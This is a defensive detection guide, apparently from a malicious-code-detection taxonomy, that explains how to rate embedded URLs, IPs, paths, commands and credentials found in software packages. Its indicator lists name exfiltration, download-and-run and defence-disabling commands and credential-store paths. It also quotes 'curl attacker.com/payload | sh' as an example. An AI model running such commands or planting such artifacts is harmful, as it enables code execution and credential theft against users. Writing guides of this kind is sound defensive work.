# MCD Lens: ARTF (Embedded Artifacts) Indicators

> **Core MCD position:** Embedded artifacts name the operational infrastructure, the C2 endpoints, credential material, target paths, and activation dates that give other behaviors their operational context. A hardcoded URL is meaningless alone; paired with `NETW.HTTP` it names the destination of a network call. A hardcoded path is inert; paired with `CRED.BROWSER` it names the credential store being raided. Artifacts are the nouns of attack operations, they tell you *where*, *what*, and *when* the verbs act. Through the MCD lens, artifact content is the fastest route to operational understanding: decode the artifacts, and you decode the attacker's infrastructure.

## Severity Baselines

| Atom | Baseline Severity | Notes |
|---|---|---|
| `ARTF.CREDENTIAL` | High | Embedded credential material is always high, there is no safe way to ship secrets in source |
| `ARTF.CRYPTO_ADDR` | High | In non-cryptocurrency packages; in crypto-specific packages, medium (expected context) |
| `ARTF.IP` | Medium | Context-dependent, public routable IPs are higher than private/loopback; VPS provider ranges escalate |
| `ARTF.URL` | Medium | Context-dependent, unknown external endpoints are higher than well-known public APIs |
| `ARTF.DOMAIN` | Medium | Context-dependent, recently registered or dynamic DNS domains escalate sharply |
| `ARTF.PATH` | Medium | Depends on the target, credential store paths and system modification targets escalate |
| `ARTF.CMD` | Medium-High | Embedded shell commands carry implicit execution intent; destructive or exfiltration commands escalate |
| `ARTF.HASH` | Low-Medium | Integrity checking is common and often benign; escalates when used in security bypass or anti-tamper |
| `ARTF.EMAIL` | Low-Medium | Contact addresses are common; escalates with free provider domains or as exfiltration targets |
| `ARTF.TIMESTAMP` | Low-Medium | Build dates and version markers are common; escalates when used in conditional activation logic |

## Escalation Factors

The following conditions increase the MCD suspicion level of any ARTF finding:

- **Artifact inside encoded or obfuscated content.** `XFRM.*` + `ARTF.*`, the author hid the artifact from static analysis. An encoded URL is a URL the author did not want reviewers to see. An obfuscated IP is an IP the author did not want automated tools to flag.
- **Multiple ARTF subtypes clustering.** A URL, a path, a shell command, and a timestamp in the same code path outline an operation: fetch from here, write to there, execute this, activate then. Isolated artifacts are ambiguous. Clustering artifacts form an operational picture.
- **Artifact in a dependency with no documented need.** A date formatting library with embedded IP addresses. A string utility with hardcoded shell commands. The package's stated purpose does not explain the artifact's presence.
- **Artifact introduced in a recent version.** Code that had no hardcoded URLs in v2.0.0 and suddenly contains three in v2.0.1 demands investigation. Diff the versions, what artifacts appeared and why?
- **Artifact constructed rather than declared.** `XFRM.STRCON` assembling a URL from character codes, or concatenating IP octets from separate variables, indicates the author wanted the artifact to evade string-level detection. Declared artifacts are visible; constructed artifacts are deliberately hidden.
- **Artifact not referenced by public API.** An embedded URL that is only reachable through internal code paths, not through any documented or exported function, has no reason to exist from a consumer's perspective.

### Subtype-Specific Escalators

- **ARTF.IP**: Non-RFC1918 public addresses, VPS/cloud provider IP ranges (DigitalOcean, Linode, Vultr, AWS EC2), addresses in countries inconsistent with the project's stated origin, multiple IPs suggesting fallback infrastructure.
- **ARTF.URL**: Recently registered domains in the URL, paths containing C2 patterns (`/gate`, `/panel`, `/beacon`, `/upload`, `/cmd`), non-standard ports, URL containing encoded parameters that decode to further artifacts, URL to paste services or file-sharing platforms.
- **ARTF.EMAIL**: Free email provider domains (gmail, outlook, protonmail, tutanota) rather than organizational domains, addresses inconsistent with package maintainer identity, addresses appearing as exfiltration targets rather than contact information.
- **ARTF.CRYPTO_ADDR**: Any cryptocurrency address in a package whose purpose is unrelated to cryptocurrency or blockchain. The address implies a payment destination, the question is what triggers payment and to whom.
- **ARTF.CREDENTIAL**: Credential matching a valid provider format (starts with `AKIA`, `ghp_`, `sk_live_`, etc.), credential that is still active/valid when tested, credential embedded in a dependency rather than application-level configuration.
- **ARTF.HASH**: Hash value used in a security-relevant comparison (integrity bypass, anti-tamper check), hash of a known malicious sample, hash used to identify a specific target environment.
- **ARTF.PATH**: Paths pointing to credential storage locations (`~/.ssh/`, `~/.aws/`, browser profile directories), system modification targets (`/etc/crontab`, `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`), paths with cross-platform variants indicating deliberate multi-OS targeting.
- **ARTF.CMD**: Commands involving network download (`curl`, `wget`, `Invoke-WebRequest`), data exfiltration (piping to `nc`, `curl -d`), privilege escalation (`sudo`, `runas`), security disabling (`iptables -F`, `Set-MpPreference -DisableRealtimeMonitoring`), or cleanup (`rm -rf`, `del /f`).
- **ARTF.DOMAIN**: Recently registered domains (< 30 days), dynamic DNS providers, privacy-protected WHOIS, suspicious TLDs (`.xyz`, `.top`, `.tk`, `.ml`), domains with high entropy labels (random-looking subdomains), domains resolving to known bulletproof hosting.
- **ARTF.TIMESTAMP**: Future dates in comparison logic (activation trigger), narrow time windows (operational window), timestamps combined with environment checks (targeted time-based activation), dates correlating with known campaigns or events.

## De-escalation Factors

The following conditions reduce, but do not eliminate, MCD suspicion:

- **Artifact matches documented infrastructure.** A URL pointing to the project's own documented API endpoint, a domain matching the project's registered domain, an IP address in the project's published infrastructure documentation.
- **Artifact is in test fixtures or example code.** Test files containing example.com URLs, RFC 5737 documentation IPs (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`), or test@example.com addresses. However, test files can contain malicious artifacts too, verify the fixtures are actually used by tests.
- **Artifact is a well-known public constant.** Google DNS (`8.8.8.8`), localhost (`127.0.0.1`), public API endpoints for well-known services, standard error reporting addresses.
- **Artifact has long version history.** Present since the package's initial release and consistent across many versions. A URL that has been in the codebase for 5 years and 200 releases is less suspicious than one that appeared yesterday, but is not automatically safe.
- **Artifact is user-configurable with the embedded value as a default.** A function that accepts a URL parameter with a default value is structurally different from a function that always uses a hardcoded URL with no override mechanism.

> **Caveat:** Artifacts that match documented infrastructure still warrant verification that the documentation is accurate and the infrastructure is legitimate. Attackers can create documentation. De-escalation reduces priority; it does not grant a pass.

## Interpretive Combinations

| Combination | MCD Interpretation | Severity |
|---|---|---|
| `ARTF.URL` or `ARTF.IP` + `NETW.*` | Named network destination, the artifact identifies where data goes or comes from | High |
| `ARTF.PATH` + `CRED.*` | Named credential target, the path identifies which credential store is accessed | High |
| `ARTF.PATH` + `FSYS.*` | Named filesystem target, the path identifies what is read, written, or modified | Medium-High |
| `ARTF.CMD` + `EXEC.*` | Named command execution, the command string identifies what the system is told to do | High |
| `ARTF.TIMESTAMP` + `TIME.CMP` | Time-gated logic, the timestamp defines when behavior activates or expires (logic bomb pattern) | High |
| `ARTF.CREDENTIAL` + `PRST.*` | Persisted credential, embedded credential material written to persistent storage | High |
| `ARTF.IP` or `ARTF.DOMAIN` + `XFRM.*` | Concealed network target, the infrastructure identifier is hidden from static analysis | High |
| `ARTF.CRYPTO_ADDR` + `RSRC.*` | Cryptocurrency payment tied to resource operation, cryptojacking or ransom pattern | Very High |
| `ARTF.HASH` + `ENVI.TAMPER` | Hash-based integrity check, code verifying its own integrity or detecting modification | Medium-High |
| `ARTF.EMAIL` + `NETW.EMAIL` | Named email target, data exfiltration or notification via email to embedded address | High |
| Multiple `ARTF.*` subtypes clustering | Operational artifact set, multiple artifact types forming a coherent attack infrastructure picture | escalates all individual severities |

## MCD-Specific Disambiguation

### ARTF.PATH vs CRED priority
When an embedded path points to a credential store (`~/.ssh/id_rsa`, `Login Data`), the MCD investigation follows the credential, not the path. `ARTF.PATH` names the location; `CRED.*` describes what is accessed. The path is evidence of targeting; the credential access is the behavior. Both are relevant, but `CRED.*` drives escalation priority.

### ARTF.CMD vs EXEC priority
An embedded command string (`ARTF.CMD`) tells you what the code *intends* to execute. The execution primitive (`EXEC.*`) tells you the mechanism. Through the MCD lens, the command content is the primary indicator, `curl attacker.com/payload | sh` is high-severity regardless of whether it runs via `subprocess.Popen` or `os.system`. The execution mechanism affects evasion assessment; the command content determines operational impact.

### ARTF.URL vs ARTF.DOMAIN vs ARTF.IP: when all three overlap
A URL like `http://203.0.113.50:8080/gate` produces `ARTF.URL`, `ARTF.IP`, and potentially path-based signals. The URL is the primary artifact, it is the most complete description of the network target. The IP and path components are structural sub-observations. Through the MCD lens, assess the URL as a unit first, then examine components for additional signals (VPS IP range, C2 path pattern).

### ARTF.CREDENTIAL vs ARTF.HASH
Provider-format API keys (`AKIA...`, `ghp_...`, `sk_live_...`) are unambiguously `ARTF.CREDENTIAL`. Fixed-length hex strings are ambiguous, they could be hash digests or credential tokens. Context resolves the ambiguity: used in authentication headers = credential; used in `==` comparison against a computed digest = hash; used as a dictionary key = determine what it indexes.

### Static artifacts vs dynamic construction
`ARTF.*` atoms describe statically observable artifacts. When an artifact is not directly visible but is constructed at runtime from fragments (`XFRM.STRCON`), encoded data (`XFRM.ENCODE`), or decrypted content (`XFRM.ENCRYPT`), the construction is the primary behavioral observation and the resulting artifact is discovered through analysis. Through the MCD lens, constructed artifacts are more suspicious than declared ones, the construction implies evasion intent.
